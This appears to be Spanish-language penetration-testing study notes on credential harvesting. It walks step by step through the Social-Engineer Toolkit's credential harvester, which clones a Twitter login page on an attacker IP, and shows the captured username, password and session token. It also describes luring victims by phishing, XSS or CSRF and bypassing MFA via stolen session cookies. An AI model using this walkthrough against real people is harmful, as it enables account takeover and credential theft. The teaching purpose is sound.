---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Credential Harvesting

La recolección de credenciales es una técnica de recopilan credenciales de usuario (como ID de usuario, direcciones de correo electrónico, contraseñas y otra información de inicio de sesión).

### ¿Cómo funciona la recolección de credenciales?

Lo más habitual es que se instale un recolector de credenciales  como una extensión maliciosa de un sitio web o una aplicación. Una vez instalado, el recolector registra cualquier información que los usuarios ingresen durante el proceso de inicio de sesión.

Debido a que los recolectores de credenciales registran todos los inicios de sesión de manera indiscriminada, los ciberdelincuentes pueden crear una reserva de nombres de usuario y contraseñas.

Si un ciberdelincuente tiene acceso a una o más contraseñas comprometidas que un individuo usó en el pasado, esa credencial le proporciona un excelente punto de partida para adivinar su información de inicio de sesión para otros sitios o sistemas.

### Técnicas comunes utilizadas en ataques de recolección de credenciales <a href="#techniques" id="techniques"></a>

La recolección de credenciales normalmente se lleva a cabo junto con otra técnica de ciberataque. Métodos de ataque más frecuentes incluyen los siguientes:

* **Malware**
* **Phishing**
* **Suplantación de dominio**
* **Ataques Man-in-the-Middle (MitM)**

Una de las formas más comunes en que los atacantes realizan la recolección de credenciales es mediante el uso de correos electrónicos de phishing y de phishing con enlaces que podrían redirigir a un usuario a un sitio falso. Este "sitio falso" podría simular un servicio en la nube legítimo, como Gmail, Office 365 o incluso un sitio de redes sociales como Twitter, LinkedIn, Instagram o Facebook. Por eso es tan importante utilizar la autenticación multifactor. Sin embargo, en algunos casos, los atacantes podrían eludir la autenticación multifactor redirigiendo al usuario a un sitio malicioso y robando una cookie de sesión del navegador del usuario.

Muchos servicios y aplicaciones alojadas en la nube utilizan el inicio de sesión único (SSO) y otros utilizan autenticación federada. A veces, las aplicaciones basadas en la nube le permiten iniciar sesión con sus credenciales de Google, Apple o Facebook. Los atacantes podrían redirigir a los usuarios a sitios web suplantados que pueden parecer páginas de inicio de sesión legítimas de Google, Apple, Facebook o Twitter. Desde allí, el atacante podría robar el nombre de usuario y la contraseña de la víctima.&#x20;

#### Ataque de recolección de credenciales mediante correos electrónicos de ingeniería social y phishing

Realizar un ataque de ingeniería social y crear una instancia de un sitio web falso para realizar un ataque de recolección de credenciales.

**Paso 1** . Inicie SET ingresando el comando **setoolkit**.

**Paso 2** . Seleccioneen el menú principal, como se muestra en el Ejemplo 7-1.

_**Ejemplo 7-1**_  : Inicio del ataque de ingeniería social

<pre><code><strong>                Select from the menu:   1) Social-Engineering Attacks   2) Penetration Testing (Fast-Track)   3) Third Party Modules   4) Update the Social-Engineer Toolkit   5) Update SET configuration   6) Help, Credits, and About  99) Exit the Social-Engineer Toolkitset> 1
</strong></code></pre>

**Paso 3** . En el menú que aparece (ver Ejemplo 7-2), seleccione **2) Vectores de ataque a sitios web** .

_**Ejemplo 7-2**_  : Selección de vectores de ataque a sitios web

<pre><code><strong>                Select from the menu:    1) Spear-Phishing Attack Vectors    2) Website Attack Vectors    3) Infectious Media Generator    4) Create a Payload and Listener    5) Mass Mailer Attack    6) Arduino-Based Attack Vector    7) Wireless Access Point Attack Vector    8) QRCode Generator Attack Vector    9) Powershell Attack Vectors   10) Third Party Modules   99) Return back to the main menu.set>2 
</strong></code></pre>

<pre><code><strong>                The Web Attack module is a unique way of utilizing multiple web-basedattacks in order to compromise the intended victim.The Java Applet Attack method will spoof a Java Certificate anddeliver a metasploit based payload. Uses a customized java appletcreated by Thomas Werth to deliver the payload.The Metasploit Browser Exploit method will utilize select Metasploitbrowser exploits through an iframe and deliver a Metasploit payload.The Credential Harvester method will utilize web cloning of awebsite that has a username and password field and harvest allthe information posted to the website.The TabNabbing method will wait for a user to move to a differenttab, then refresh the page to something different.The Web-Jacking Attack method was introduced by white_sheep, emgent.This method utilizes iframe replacements to make the highlighted URLlink to appear legitimate however when clicked a window pops up thenis replaced with the malicious link. You can edit the link replacementsettings in the set_config if it's too slow/fast.The Multi-Attack method will add a combination of attacks throughthe web attack menu. For example, you can utilize the Java Applet,Metasploit Browser, Credential Harvester/Tabnabbing all at once to seewhich is successful.The HTA Attack method will allow you to clone a site and performpowershell injection through HTA files which can be used forWindows-based powershell exploitation through the browser.   1) Java Applet Attack Method   2) Metasploit Browser Exploit Method   3) Credential Harvester Attack Method   4) Tabnabbing Attack Method   5) Web Jacking Attack Method   6) Multi-Attack Web Method   7) HTA Attack Method  99) Return to Main Menuset:webattack>3
</strong></code></pre>

_**Ejemplo 7-3**_  : Selección del método de ataque de recolección de credenciales

**Etapa 4** . En el menú y la explicación que aparecen a continuación (consulte el Ejemplo 7-3), seleccione **3) Método de ataque de recolección de credenciales** .

<pre><code><strong>                The first method will allow SET to import a list of pre-defined webapplications that it can utilize within the attack.The second method will completely clone a website of your choosingand allow you to utilize the attack vectors within the completelysame web application you were attempting to clone.The third method allows you to import your own website, note that youshould only have an index.html when using the import websitefunctionality.   1) Web Templates   2) Site Cloner   3) Custom Import  99) Return to Webattack Menuset:webattack>1
</strong></code></pre>

_**Ejemplo 7-4**_  : Selección de una plantilla web predefinida

**Paso 5** . En el menú que aparece a continuación (ver Ejemplo 7-4), seleccione **1) Plantillas web** para utilizar una plantilla web predefinida (Twitter). Como puede ver, también tiene opciones para clonar un sitio web existente o importar un sitio web personalizado. En este ejemplo, utiliza una plantilla web predefinida.

\


**Paso 6** . En el menú que se muestra en el Ejemplo 7-5, ingrese la dirección IP del host que le gustaría usar para recopilar las credenciales del usuario (en este caso, **192.168.88.225** ). En este ejemplo, SET ha reconocido la dirección IP del sistema atacante. Si esto le ocurre a usted, puede simplemente presionar **Enter** para seleccionar la dirección IP del sistema atacante.

_**Ejemplo 7-5**_  : Ingreso de la dirección IP del recolector de credenciales

<pre><code><strong>                [-] Credential harvester will allow you to utilize the clonecapabilities within SET[-] to harvest credentials or parameters from a website as well asplace them into a report------------------------------------------------------------------------- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS *IMPORTANT * --The way that this works is by cloning a site and looking for formfields to rewrite. If the POST fields are not usual methods forposting forms this could fail. If it does, you can always save theHTML, rewrite the forms to be standard forms and use the "IMPORT"feature. Additionally, really important:If you are using an EXTERNAL IP ADDRESS, you need to place theEXTERNAL IP address below, not your NAT address. Additionally, ifyou don't know basic networking concepts, and you have a privateIP address, you will need to do port forwarding to your NAT IPaddress from your external IP address. A browser doesn't know howto communicate with a private IP address, so if you don't specifyan external IP address if you are using this from an externalperspective, it will not work. This isn't a SET issue this is hownetworking works.set:webattack> IP address for the POST back in Harvester/Tabnabbing[192.168.88.225]:
</strong></code></pre>

**Paso 7** . Seleccione **3. Twitter** , como se muestra en el ejemplo 7-6.

_**Ejemplo 7-6**_  : Selección de la plantilla para Twitter

<pre><code><strong>                --------------------------------------------------------                 **** Important Information ****For templates, when a POST is initiated to harvestcredentials, you will need a site for it to redirect.You can configure this option under:      /etc/setoolkit/set.configEdit this file, and change HARVESTER_REDIRECT andHARVESTER_URL to the sites you want to redirect toafter it is posted. If you do not set these, thenit will not redirect properly. This only goes fortemplates.--------------------------------------------------------  1. Java Required  2. Google  3. Twitterset:webattack> Select a template:3[*] Cloning the website: http://www.twitter.com[*] This could take a little bit...The best way to use this attack is if username and password formfields are available. Regardless, this captures all POSTs on awebsite.[*] The Social-Engineer Toolkit Credential Harvester Attack[*] Credential Harvester is running on port 80[*] Information will be displayed to you as it arrives below:
</strong>
              
</code></pre>

Luego, puede redirigir a los usuarios a este sitio falso de Twitter enviando un correo electrónico de phishing o aprovechando vulnerabilidades web como secuencias de comandos entre sitios (XSS) y falsificación de solicitudes entre sitios (CSRF). La Figura 7-2 muestra la página de inicio de sesión falsa de Twitter, donde el usuario ingresa sus credenciales.

_Página de inicio de sesión falsa_



El ejemplo 7-7 muestra cómo el sistema atacante recopila las credenciales del usuario. El nombre de usuario ingresado es _santosomar_ y la contraseña es _superbadpassword_ . También puede ver el token de sesión.

_**Ejemplo 7-7**_ _: Recopilación de credenciales de usuario_

```
192.168.78.238 - - [28/Jun/2021 23:07:41] "GET / HTTP/1.1" 200 -[*] WE GOT A HIT! Printing the output:POSSIBLE USERNAME FIELD FOUND: session[username_or_email]=santosomarPOSSIBLE PASSWORD FIELD FOUND: session[password]=superbadpasswordPARAM: authenticity_token=dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52PARAM: scribe_log=POSSIBLE USERNAME FIELD FOUND: redirect_after_login=PARAM: authenticity_token=dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.192.168.78.238 - - [28/Jun/2021 23:08:27] "POST /sessions HTTP/1.1"302 - 
```

<mark style="color:red;">**Recursos**</mark>&#x20;

{% embed url="https://www.crowdstrike.com/cybersecurity-101/cyberattacks/credential-harvesting/" %}
